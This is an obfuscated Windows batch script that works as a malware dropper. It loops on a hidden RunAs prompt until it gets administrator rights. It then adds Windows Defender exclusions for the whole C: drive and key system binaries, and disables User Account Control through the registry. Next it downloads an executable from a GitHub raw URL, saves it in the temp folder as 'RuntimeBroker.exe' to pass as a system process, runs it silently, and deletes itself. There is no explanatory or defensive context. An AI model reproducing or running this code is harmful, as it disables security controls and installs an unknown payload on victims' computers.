@echo off & setlocal enableDelayedExpansion
set "MkoWl=NET" & set "amQbx=2>&1" & set "JoJo=>nul" & set "osRiW=SESSION"
%MkoWl% %osRiW% %JoJo% %amQbx%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "djpU=baz" & set "rfwXb=qux" & set "uTLJx=foo" & set "BFM=bar" & rem TtSqXeL rELzgyx rRK
set "wZXaW=powershell -ExecutionPolicy Bypass -Command"
set "XfY=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "Eeok='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "FBbSk='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!wZXaW! "!XfY! !Eeok! !FBbSk!" %JoJo% %amQbx%
set "Emh=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "VRW=-Name 'EnableLUA' -Value 0"
!wZXaW! "!Emh! !VRW!" %JoJo% %amQbx%
set "IGCIN=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!wZXaW! "!IGCIN!" %JoJo% %amQbx%
if !errorlevel! neq 0 (goto %a%)
set "QFjF=timeout /t" & !QFjF! 2 %JoJo% %amQbx%
set "ESuU=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "uSzC=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "AcZy=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!wZXaW! "!ESuU! !uSzC! !AcZy!" %JoJo% %amQbx%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!QFjF! 1 %JoJo% %amQbx% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %JoJo% %amQbx%
del /f /q "%~f0" %JoJo% %amQbx%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %JoJo% %amQbx%
if !errorlevel! neq 0 (!QFjF! 3 %JoJo% %amQbx% & goto %b%)
exit /b
